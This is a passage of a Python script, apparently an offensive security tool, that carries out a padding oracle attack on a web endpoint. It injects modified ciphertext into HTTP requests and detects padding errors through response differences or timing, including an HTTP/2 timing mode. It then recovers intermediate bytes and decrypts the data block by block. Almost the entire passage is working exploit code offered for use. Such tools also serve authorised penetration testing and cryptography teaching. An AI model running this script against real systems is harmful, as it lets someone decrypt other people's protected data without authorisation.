            # '6d:0000000000000000000000000000006de3e8f0c1d881e05ec4f18207217947c4',
            # '6e:0000000000000000000000000000006ee3e8f0c1d881e05ec4f18207217947c4',
            # '6f:0000000000000000000000000000006fe3e8f0c1d881e05ec4f18207217947c4']

            internal_counter = 0
            http2_input_list, http2_output_list = http2_payload_sender(authority, port, current_http2_payloads, headers)

            # This code sends a group of requests, identifies the hex_byte with the fastest response and the
            # hex_byte with the slowest response. Then, the order of the payloads is reversed and they are sent a second
            # time. Again, we identify the hex_byte with the fastest response and the hex_byte with the slowest response
            # if either of these values remain the same, it's likely that we are triggering a timing difference that
            # is independent of the sequence in which the payloads are sent.

            last_byte_one = ""
            last_stream_id_one = ""
            first_byte_one = ""
            first_stream_id_one = ""
            biggest_response_delay = 0
            smallest_response_delay = 9983112217353697300

            for item in http2_output_list:
                #print("item: " + item)
                if int(item.split(':')[1]) >= int(biggest_response_delay):
                    biggest_response_delay = item.split(':')[1]
                    last_stream_id_one = item.split(':')[0]
                if int(item.split(':')[1]) <= int(smallest_response_delay):
                    smallest_response_delay = item.split(':')[1]
                    first_stream_id_one = item.split(':')[0]

            for item in http2_input_list:
                if item.split(':')[0] == last_stream_id_one:
                    last_byte_one = item.split(':')[1]
                if item.split(':')[0] == first_stream_id_one:
                    first_byte_one = item.split(':')[1]

            #print("last_byte_one:  " + last_byte_one)
            #print("first_byte_one: " + first_byte_one)
            # reverse the order of the payloads list and resend it:
            current_http2_payloads.reverse()
            http2_input_list, http2_output_list = http2_payload_sender(authority, port, current_http2_payloads, headers)

            last_byte_two = ""
            last_stream_id_two = ""
            first_byte_two = ""
            first_stream_id_two = ""
            biggest_response_delay = 0
            smallest_response_delay = 9983112217353697300

            for item in http2_output_list:
                if int(item.split(':')[1]) >= int(biggest_response_delay):
                    biggest_response_delay = item.split(':')[1]
                    last_stream_id_two = item.split(':')[0]
                if int(item.split(':')[1]) <= int(smallest_response_delay):
                    smallest_response_delay = item.split(':')[1]
                    first_stream_id_two = item.split(':')[0]

            for item in http2_input_list:
                if item.split(':')[0] == last_stream_id_two:
                    last_byte_two = item.split(':')[1]
                if item.split(':')[0] == first_stream_id_two:
                    first_byte_two = item.split(':')[1]

            #print("last_byte_two:  " + last_byte_two)
            #print("first_byte_two: " + first_byte_two)

            if last_byte_one == last_byte_two:
                return last_byte_one

            if first_byte_one == first_byte_two:
                return first_byte_one

            group_counter += 1
            current_http2_payloads = []
    return False

def pretty_print_post(req):
    # taken from https://stackoverflow.com/questions/20658572/python-requests-print-entire-http-request-raw
    print('{}\n{}\r\n{}\r\n\r\n{}'.format(
        '---------------START---------------',
        req.method + ' ' + req.url,
        '\r\n'.join('{}: {}'.format(k, vg) for k, vg in req.headers.items()),
        req.body,
    ))
    print('----------------END----------------')

def pretty_print_get(req):
    print('{}\n{}\n{}'.format(
        '---------------START---------------',
        req.method + ' ' + req.url,
        '\r\n'.join('{}: {}'.format(k, vg) for k, vg in req.headers.items())
    ))
    print('----------------END----------------')

if __name__ == '__main__':
    scheme, authority, port = parse_host_input(url)
    print("[i] Scheme:           " + scheme)
    print("[i] Authority:        " + authority)
    print("[i] Port:             " + str(port))

    # test our example request - it should return a 200
    # if it doesn't, something has gone wrong
    print("[i] Sending test request...")

    if method == "POST":
        encoded_payload = ciphertext.replace('+', '%2b').replace('=', '%3d')
        my_body_string = body.replace("[INJECT HERE]", encoded_payload)
        my_url = scheme + "://" + authority + ":" + str(port) + path
        res = requests.post(my_url, data=my_body_string, headers=headers, verify=False)
    else: # GET pathway:
        encoded_payload = ciphertext.replace('+', '%2b').replace('=', '%3d')
        my_query_string = body.replace("[INJECT HERE]", encoded_payload)
        my_url = scheme + "://" + authority + ":" + str(port) + path + "?" + my_query_string
        res = requests.get(my_url, headers=headers, verify=False)

    if res.status_code == 200:
        print("[i] Response is 200 - proceeding to testing!")
    else:
        print("[!] Fatal error - test request returned a non-200 response!")
        if method == "POST":
            pretty_print_post(res.request)
        if method == "GET":
            pretty_print_get(res.request)
        print(res.status_code)
        sys.exit()

    # chop the encrypted_bytes into blocks and put them in a list:
    block_list, block_length = slice_up_encrypted_bytes(encrypted_bytes, block_size)

    # STEP 1: perform an initial fuzz of the last byte of the last block
    # This step is just to gather the selection criteria of a non-padding error response
    # Grab the final block for now - later we will need to loop down through the blocks:
    ciphertext = block_list[-1]

    # fuzz the last byte of the IV and gather the details of the responses into results_list:
    results_list = byte_fuzzer(block_length, ciphertext, 0)

    # analyze the results_list:
    analysis_list = analyse(results_list)

    # distil the analysis_list into unique results:
    unique_list = unique_table(analysis_list)

    # assume we don't need to use time based
    time_based_mode = False
    upper_bound = ""
    lower_bound = ""

    # let the user select the signature of the non-padding error response from the unique results:
    selection = user_selection(unique_list)

    normal_mode = False
    if selection:
        print("[i] Normal mode selected")
        normal_mode = True
    else:
        print("[i] Could not detect a padding oracle using response status, length etc. Attempting time-based attack.")
        time_based_mode = True
        if http2_mode:
            print("[i] HTTP2 SPA time based mode initiated!")
        else:
            upper_bound, lower_bound = time_based_analysis(ciphertext, delay_if_time_based)
            print("[i] Standard time based mode initiated")

    plaintext_buffer = ""
    zeroing_iv_buffer = ""

    # STEP 2: Now that we have the selection criteria, we can start looping forward from the first block
    # if No IV mode is activated, we can start from block 0, otherwise, we start from block 1 as we want
    # to skip the IV block if it's present
    # this block_count integer counter will decide the position of the block_list we will take for fuzzing
    if no_iv_mode:
        block_count = 0
    else:
        block_count = 1
    simple_counter = 1  # as the block_count can start from 0 or 1, I needed a simple counter to count the loops
    while block_count < len(block_list):
        print("\n*** Starting Block " + str(simple_counter) + " of " + str(len(block_list)) + " ***")

        # print("*** Starting Block " + str(block_count) + " of " + str(len(block_list) - 1) + " ***")
        # obtain the current block from the ciphertext
        current_block = block_list[block_count]

        # initialize a negative counter at 1/2 of block_length
        # we will use this to work back from the last byte to
        # the first of the block
        position_to_fuzz = block_size

        # this counter will be the opposite of position_to_fuzz - it will start
        # at 1, and increment up to the block size value we need this to know
        # what the plaintext would be for each loop - for example:
        #     the plaintext for position 16 will be 01
        #     the plaintext for position 15 will be 02
        #     the plaintext for position 14 will be 03
        fuzz_loop_count = 1

        padding_array = ""
        postfix_byte_array = ""
        zeroing_iv_array = ""
        zeroing_iv_byte = ""
        postfix_byte = ""
        plain_text = ""

        while position_to_fuzz > 0:
            if normal_mode:
                byte_found = full_byte_fuzzer(2, current_block, selection, position_to_fuzz, postfix_byte,
                                              upper_bound, lower_bound, delay_if_time_based)
                if not byte_found:
                    print("[!] Detection error: No match was found.")
                    print("[i] Trying again.")
                    byte_found = full_byte_fuzzer(block_length, current_block, selection, position_to_fuzz,
                                                  postfix_byte, upper_bound, lower_bound, delay_if_time_based)

            else:
                if http2_mode:
                    byte_found = http2_fuzz_manager(block_length, current_block, selection, position_to_fuzz, postfix_byte,
                                                    upper_bound, lower_bound, delay_if_time_based)
                    if not byte_found:
                        print("[!] Detection error: No match was found.")
                        print("[i] Trying again.")
                        byte_found = http2_fuzz_manager(block_length, current_block, selection, position_to_fuzz,
                                                        postfix_byte,
                                                        upper_bound, lower_bound, delay_if_time_based)
                else:
                    byte_found = full_byte_fuzzer(2, current_block, selection, position_to_fuzz, postfix_byte,
                                                  upper_bound, lower_bound, delay_if_time_based)
                    if not byte_found:
                        print("[!] Detection error: No match was found.")
                        print("[i] Trying again.")
                        byte_found = full_byte_fuzzer(block_length, current_block, selection, position_to_fuzz,
                                                      postfix_byte, upper_bound, lower_bound, delay_if_time_based)

            # let the user know on success:
            if byte_found is not None:
                found_value = binascii.unhexlify(byte_found)
                print("[+] Success: (" + str(256 - (int.from_bytes(found_value, "little"))) + "/256)\t[Byte " + str(
                    position_to_fuzz) + "]")
            else:
                print("[!] Fatal error: detection failed. Check settings.")
                sys.exit()
            # at this point, we have found a matching byte using the padding oracle.
            # we now need to set up the values to fuzz the byte at the next position.

            # get the current input value, expressed as a hex value:
            current_byte_input_value = f"{fuzz_loop_count:02x}"

            # print("byte_found:               ", byte_found)
            # print("current_byte_input_value: ", current_byte_input_value)

            # print("XORing " + byte_found + " with " + current_byte_input_value + ":")
            zeroing_iv_byte = xor_bytes(byte_found, current_byte_input_value)
            # print("zeroing_iv_byte:          ", zeroing_iv_byte)
            if len(zeroing_iv_byte) % 2 != 0:
                print("[!] Fatal error: bytes strings must be even length")
                print("zeroing_iv_byte: " + zeroing_iv_byte)
                sys.exit()

            # we build up an array of bytes that is the 'zeroing IV'
            zeroing_iv_array = zeroing_iv_byte + zeroing_iv_array
            if len(zeroing_iv_array) % 2 != 0:
                print("[!] Fatal error: bytes strings must be even length")
                print("zeroing_iv_array: " + zeroing_iv_array)
                sys.exit()

            # we need to construct a padding array. these look like:
            # 02
            # 0303
            # 040404
            # this is what we want to feed into the padding oracle
            # however, we must xor these values with the zeroing IV
            # before we feed them in - this is a known plaintext attack
            i = fuzz_loop_count
            v = f"{(i + 1):02x}"
            padding_array = v * i
            if len(padding_array) % 2 != 0:
                print("[!] Fatal error: bytes strings must be even length")
                print("padding_array: " + padding_array)
                sys.exit()

            # print("zeroing_iv_array:         ", zeroing_iv_array)
            # print("padding_array:            ", padding_array)

            # print("XORing " + padding_array + " with " + zeroing_iv_array + ":")
            postfix_byte = xor_bytes(padding_array, zeroing_iv_array)
            if len(postfix_byte) % 2 != 0:
                print("[!] Fatal error: bytes strings must be even length")
                print("postfix_byte: " + postfix_byte)
                sys.exit()

            # print("postfix_byte:             ", postfix_byte)

            fuzz_loop_count += 1
            position_to_fuzz -= 1
        ## !! NOTE - OUTER LOOP IS HERE !! ###
        ## THIS IS RETURNING TO BLOCK-LEVEL ##
        plain_text = xor_bytes(zeroing_iv_array, block_list[block_count - 1])
        print("\nBlock " + str(simple_counter) + " Results:")
        print("[+] Cipher Text (HEX):        ", current_block)
        print("[+] Intermediate Bytes (HEX): ", zeroing_iv_array)
        print("[+] Decrypted value (ASCII):   " + bytewise_decrypter(zeroing_iv_array, block_list[block_count - 1]))
        print("[+] Plain Text:                " + plain_text)
        block_count += 1
        simple_counter += 1
        plaintext_buffer = plaintext_buffer + plain_text
        zeroing_iv_buffer = zeroing_iv_buffer + zeroing_iv_array
    print("-------------------------------------------------------")
    print("*** Finished ***")
    print("")
    print("[+] Zeroing IV (HEX):         " + zeroing_iv_buffer)
    print("")
    print("[+] Decrypted value (HEX):    " + plaintext_buffer)
    print("")

    # we need to get all the blocks except the last one, then xor this with the zeroing_iv_buffer
    # this should give us the plain text
    full_block_buffer = encrypted_bytes[:-block_length]

    print("[+] Decrypted value (ASCII):   " + bytewise_decrypter(zeroing_iv_buffer, full_block_buffer))
    print("")
    # plaintext_buffer_bytes = plaintext_buffer.decode("ascii")
    base64_bytes = base64.b64encode(binascii.unhexlify(plaintext_buffer))
    base64_string = base64_bytes.decode("ascii")
    print("[+] Decrypted value (Base64):  " + base64_string)
    print("")
    print("-------------------------------------------------------")
